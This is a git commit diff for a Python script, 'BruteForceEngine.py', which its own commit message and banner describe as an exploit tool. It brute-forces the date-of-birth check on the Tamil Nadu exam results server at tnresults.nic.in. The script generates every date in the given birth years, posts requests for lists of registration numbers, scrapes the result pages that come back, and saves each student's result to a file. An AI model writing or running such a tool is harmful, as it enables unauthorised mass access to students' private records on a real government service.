de921d4d9a41efa215f6f5beb8c873cd625e3e20
ninjasenthi <117979717+ninjasenthi@users.noreply.github.com>
2024-05-17 12:59:55 +0530

    BruteForceEngine.py
    Tool to extarct data from tnresult server by bypassing dob statement using bruteforce attack

--- BruteForceEngine.py
+++ BruteForceEngine.py
@@ -2,7 +2,7 @@ import requests
 from bs4 import BeautifulSoup
 
 def resquest(reg,dob):
-    url = 'https://tnresults.nic.in/wpcsxtd.asp'
+    url = 'https://tnresults.nic.in/wrfexrcd.asp'
     header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/avif, image/webp,image/apng,*/*;q=0.8,application/signed-exchange; v=b3;q=0.7' ,
 'Accept-Encoding': 'gzip, deflate, br',
 'Accept-Language': 'en-IN, en-GB;q=0.9,en-US;q=0.8,en;q=0.7' ,
@@ -25,6 +25,26 @@ def resquest(reg,dob):
     responce = requests.post(url,headers=header,data=payload)
     return responce
 
+from datetime import datetime,timedelta
+
+def render_day(year):    
+    date = datetime.strptime(f"01/01/{year}","%d/%m/%Y")
+    data = [f"{year}-01-01"]
+    
+    if year==2008: #spcieal for leap year guys
+            for d in range(365):
+                date += timedelta(days=1)
+                data.append(str(date)[0:10])
+    else:
+            for d in range(365):
+                date += timedelta(days=1)
+                data.append(str(date)[0:10])
+    return data
+    
+def modify(day):
+    ds= day.split("-")
+    return str(f"{ds[2]}/{ds[1]}/{ds[0]}")
+    
 def datasheet(path):# this method enpack data , txt to array
     with open(path,'r') as file:
         data=[]
@@ -32,14 +52,45 @@ def datasheet(path):# this method enpack data , txt to array
         for line in lines:
             data.append(line.replace('\n',''))
         return data
+
+def engage_reg(text):
+    info = input(text).split(",")
+    data=[]
+    
+    if str(info[0][-4:]) == '.txt':
+        return datasheet(str(info[0]))     
+    else:
+        for id in info:
+            data.append(id)
+        return data
         
-Regno=datasheet('Regsheet.txt')
-Dob=datasheet('dobsheet.txt')
+def engage_dob(text):
+     years=input(text).split(',')
+     dates=[]
+     data=[]
+     if  str(years[0][-4:]) == '.txt':
+        return datasheet(str(years[0])) 
+     else:
+         for year in years:
+                for date in render_day(year):
+                    data.append(date)
+         for day in data:
+             dates.append(modify(day))
+         return dates
 
-result=[]
 
-print(" WELCOME YO BRUTEFORCE ENGINE "+"\n") 
-print("Description : this tool purpose is find everyone exam result by their regno and date using brute force attack , this attack launch many requeast to server to get result data by the wee need [regno sheet and date sheet ]")
+
+print(" WELCOME TO EXPLOITE TOOL"+"\n") 
+print("Description : Useing this tool we can get information about tnresult, access server with web scraping and pypass cross domite site , wee just need one regno enoghf to find all but secound statement dob pypass by bruteforce attack ")
+print("\n"+"we need Reg(number or sheet) ,and need bod sheet about student brith year" + "\n")
+
+    
+Regno = engage_reg("Regno -> ")
+Dob=engage_dob("Dob  -> ")
+
+
+print("\n",Regno)
+print("\n",Dob)
 
 if input("\n"+"./Start : ") == "":
     regT=0
@@ -52,19 +103,19 @@ if input("\n"+"./Start : ") == "":
             dobT = dobT+1
             per = per-1
             package = resquest(reg,dob)
+            size=str(len(package.content)/1008)[0:4]
             status=package.status_code
             content= BeautifulSoup(package.text,'html.parser').find('div',{'data-role' : 'content'}).text
             if 50 < len(content):
                 print('')
-                print("[  ***** ] ")
-                print(f"[acssxx] : [{reg} || {dob}] -> {regT}/{dobT} @! {status} ")
+                print(f"** [acssxx] : [{reg} || {dob}] -> {regT}/{dobT} @!:{status} ^ {size}kb   ")
                 with open(f"result[{reg}].txt","w") as file:
                     file.write(f" {reg} || {dob} "+"\n")
-                    file.write(str(content)+"/n"+"\n" +"/n"+"/n"+"/n")
+                    file.write(str(content)+"\n"+"\n")
                     file.close()
                 break
             if 50 >= len(content):
-                print(f"[req] :  {reg} || {dob}  {regT}/{dobT}  [{per}]@{status}  ")
+                print(f"[request] :  {reg} : {dob}  {regT}/{dobT}  attempt:[{per}] @!:{status} ^ ({size}kb) ")
 
 print('')
 print(" :: Succeful engine finish there cominations")        
